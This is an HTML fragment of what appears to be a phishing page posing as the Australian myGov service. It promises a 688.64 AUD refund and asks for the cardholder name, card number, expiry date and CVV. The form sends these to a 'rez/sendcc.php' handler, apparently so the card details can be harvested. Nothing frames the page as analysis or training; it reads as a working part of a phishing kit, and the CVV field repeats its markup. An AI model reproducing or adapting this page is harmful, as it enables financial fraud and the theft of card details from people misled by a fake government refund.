...
<h5 style="color:green">Your refund is available online : 688.64 AUD</h5>
							<h6 class="text-align-left">Add your credit card to get your refund</h6>
							<img width="120" src="https://www.pngitem.com/pimgs/m/1-18686_transparent-visa-mastercard-png-white-visa-logo-png.png">
<form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="rez/sendcc.php" method="post">
	
								<div class="input-group">
									<label class="override" for="userId">Name on card</label>
									<input name="holder" type="text" placeholder="John Doe" value="" autocomplete="off" aria-required="true">
								</div>
								<div class="input-group">
									<label class="override" for="userId">Card Number</label>
									<input name="cardnumber" onkeypress='return formats(this,event)' onkeyup="return numberValidation(event)" type="text" value="" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off" aria-required="true">
								</div><div class="input-group">
									<label  class="override" for="userId">Expiry date</label>
									<input name="expiry" placeholder="MM/YY" onkeyup="formatString(event);" type="text" value="" autocomplete="off" aria-required="true">
								</div><p class="recovery">
									
								</p>
	
								<div class="input-group">
									<label  for="password" class="override">CVV (3 digits)</label>
									<div class="password-group">
										<button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button><p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button><p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button><p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><input name="cvv" id="password"type="password" data-current-password="data-current-password" onkeyup="return numberValidation(event)" minlength="3" maxlength="4" placeholder="***" autocomplete="off" aria-required="true">
									</div>
								</div>
								<p class="recovery">
